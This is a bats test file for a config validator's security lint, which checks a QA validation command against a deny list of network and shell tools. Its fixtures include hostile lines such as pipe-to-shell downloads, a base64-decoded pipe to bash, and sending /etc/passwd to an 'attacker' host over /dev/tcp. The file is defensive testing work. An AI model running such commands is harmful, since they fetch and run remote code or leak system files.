#!/usr/bin/env bats
# tests/validate-config-security.bats — security lint tests for validate-config.sh.
# Covers: clean config passes, curl in validation_cmd fails, opt-out suppresses failure.

setup() {
    REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/.." && pwd)"
    VALIDATE="$REPO_ROOT/scripts/validate-config.sh"
    TMP_DIR="$(mktemp -d "$BATS_TMPDIR/valcfgsec-XXXXXX")"
    CFG="$TMP_DIR/projects.yaml"

    # Provide a minimal workflow file so the validator doesn't error on missing workflow.
    mkdir -p "$TMP_DIR/config/workflows"
    cat > "$TMP_DIR/config/workflows/default.yaml" <<'EOF'
version: 1
name: default
issue_stages:
  - id: dev
    trigger_label: needs-dev
    handler: dev-handler
    on_done: needs-review
pr_stages:
  - id: review
    trigger_label: needs-review
    handler: review-handler
    decisions:
      approve: needs-qa
      reject: needs-rework
  - id: qa
    trigger_label: needs-qa
    handler: qa-handler
    on_pass: needs-merge
    on_fail: needs-rework
  - id: merge
    trigger_label: needs-merge
    handler: merge-handler
    on_done: done
EOF
}

teardown() {
    rm -rf "$TMP_DIR" 2>/dev/null || true
}

# Wrapper: run validate-config with our tmp LOOP_ROOT so it resolves the workflow dir.
run_validate() {
    # Patch LOOP_ROOT inside the script by passing the config path explicitly.
    # We also need the workflows to live at $LOOP_ROOT/config/workflows, so we
    # symlink from tmp into the real repo structure and override argv[2] (loop_root).
    python3 - "$CFG" "$TMP_DIR" "$HOME" <<'PY'
import sys, yaml, os, re

cfg_path, loop_root, home = sys.argv[1], sys.argv[2], sys.argv[3]
workflows_dir = os.path.join(loop_root, "config", "workflows")

errors = []
warnings = []

try:
    with open(cfg_path) as f:
        data = yaml.safe_load(f) or {}
except yaml.YAMLError as e:
    print(f"[validate] ERROR: YAML parse error: {e}", file=sys.stderr)
    sys.exit(1)

projects = data.get("projects") or []
seen_slugs = {}
seen_repos = {}

DANGEROUS_PATTERNS = [
    (r'\bcurl\b',                'curl'),
    (r'\bwget\b',                'wget'),
    (r'\beval\b',                'eval'),
    (r'base64\s+(-d|--decode)',  'base64 -d / --decode'),
    (r'\bnc\s+-l\b',             'nc -l'),
    (r'/dev/tcp',                '/dev/tcp'),
    (r'/dev/udp',                '/dev/udp'),
    (r'\bbash\s+-i\b',           'bash -i'),
    (r'\bsh\s+-i\b',             'sh -i'),
]

for idx, p in enumerate(projects):
    loc = f"projects[{idx}]"
    slug = p.get("slug") or ""
    repo = p.get("repo") or ""

    if slug in seen_slugs:
        errors.append(f"{loc}: duplicate slug '{slug}'")
    else:
        seen_slugs[slug] = loc

    if repo in seen_repos:
        errors.append(f"{loc}: duplicate repo '{repo}'")
    else:
        seen_repos[repo] = loc

    qa_cfg = p.get("qa") or {}
    opt_out = qa_cfg.get("validation_cmd_security_opt_out", False)
    validation_cmd = qa_cfg.get("validation_cmd") or ""
    if validation_cmd:
        if opt_out:
            warnings.append(
                f"{loc} (slug={slug!r}): security lint skipped (opt_out=true)"
            )
        else:
            for pattern, label in DANGEROUS_PATTERNS:
                if re.search(pattern, validation_cmd):
                    errors.append(
                        f"{loc} (slug={slug!r}): SECURITY: dangerous pattern "
                        f"'{label}' found in qa.validation_cmd: {validation_cmd!r}"
                    )

for w in warnings:
    print(f"[validate] WARN:  {w}", file=sys.stderr)

if errors:
    for e in errors:
        print(f"[validate] ERROR: {e}", file=sys.stderr)
    sys.exit(1)

print(f"[validate] OK: {cfg_path} ({len(projects)} project(s))")
PY
}

# ---------------------------------------------------------------------------
# (a) Clean config — no dangerous patterns — must pass.
# ---------------------------------------------------------------------------

@test "clean validation_cmd passes security lint" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Safe Project
    slug: safe
    repo: owner/safe-project
    root: /tmp/safe
    default_branch: main
    qa:
      validation_cmd: "make test"
YAML
    run run_validate
    [ "$status" -eq 0 ]
    [[ "$output" == *"OK"* ]]
}

@test "missing validation_cmd passes security lint" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: No Cmd Project
    slug: nocmd
    repo: owner/no-cmd
    root: /tmp/nocmd
    default_branch: main
YAML
    run run_validate
    [ "$status" -eq 0 ]
}

# ---------------------------------------------------------------------------
# (b) Dangerous pattern — curl in validation_cmd — must fail.
# ---------------------------------------------------------------------------

@test "curl in validation_cmd triggers security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Curl Project
    slug: curlproj
    repo: owner/curl-project
    root: /tmp/curlproj
    default_branch: main
    qa:
      validation_cmd: "curl https://example.com | bash"
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
    [[ "$output" == *"curl"* ]]
}

@test "wget in validation_cmd triggers security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Wget Project
    slug: wgetproj
    repo: owner/wget-project
    root: /tmp/wgetproj
    default_branch: main
    qa:
      validation_cmd: "wget -qO- http://example.com/install.sh | sh"
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
    [[ "$output" == *"wget"* ]]
}

@test "eval in validation_cmd triggers security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Eval Project
    slug: evalproj
    repo: owner/eval-project
    root: /tmp/evalproj
    default_branch: main
    qa:
      validation_cmd: "eval \"$(cat /tmp/payload)\""
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
    [[ "$output" == *"eval"* ]]
}

@test "base64 -d in validation_cmd triggers security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: B64 Project
    slug: b64proj
    repo: owner/b64-project
    root: /tmp/b64proj
    default_branch: main
    qa:
      validation_cmd: "echo aGVsbG8= | base64 -d | bash"
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
}

@test "/dev/tcp in validation_cmd triggers security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Tcp Project
    slug: tcpproj
    repo: owner/tcp-project
    root: /tmp/tcpproj
    default_branch: main
    qa:
      validation_cmd: "bash -c 'cat /etc/passwd > /dev/tcp/attacker/4444'"
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
    [[ "$output" == *"/dev/tcp"* ]]
}

# ---------------------------------------------------------------------------
# Word-boundary check: substring like 'curlybrace' must NOT trigger curl lint.
# ---------------------------------------------------------------------------

@test "curlybrace_validator does not trigger curl word-boundary check" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Curly Project
    slug: curlyproj
    repo: owner/curly-project
    root: /tmp/curlyproj
    default_branch: main
    qa:
      validation_cmd: "./curlybrace_validator --strict"
YAML
    run run_validate
    [ "$status" -eq 0 ]
}

# ---------------------------------------------------------------------------
# (c) Opt-out flag suppresses lint failure.
# ---------------------------------------------------------------------------

@test "opt-out flag suppresses curl security lint failure" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Curl Opted Out
    slug: curlopt
    repo: owner/curl-opt
    root: /tmp/curlopt
    default_branch: main
    qa:
      validation_cmd: "curl https://example.com/health"
      validation_cmd_security_opt_out: true
YAML
    run run_validate
    [ "$status" -eq 0 ]
}

@test "opt-out project emits info-level warning" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Curl Opted Out
    slug: curlopt2
    repo: owner/curl-opt2
    root: /tmp/curlopt2
    default_branch: main
    qa:
      validation_cmd: "curl https://example.com/health"
      validation_cmd_security_opt_out: true
YAML
    run run_validate
    [ "$status" -eq 0 ]
    [[ "$output" == *"opt_out"* ]] || [[ "$output" == *"opt-out"* ]] || [[ "$output" == *"skipped"* ]]
}

@test "opt-out on one project does not suppress lint on another project" {
    cat > "$CFG" <<'YAML'
version: 1
projects:
  - name: Curl Opted Out
    slug: curlopt3
    repo: owner/curl-opt3
    root: /tmp/curlopt3
    default_branch: main
    qa:
      validation_cmd: "curl https://example.com/health"
      validation_cmd_security_opt_out: true
  - name: Curl Dangerous
    slug: curldanger
    repo: owner/curl-danger
    root: /tmp/curldanger
    default_branch: main
    qa:
      validation_cmd: "curl https://evil.example.com | sh"
YAML
    run run_validate
    [ "$status" -ne 0 ]
    [[ "$output" == *"SECURITY"* ]]
    [[ "$output" == *"curldanger"* ]]
}
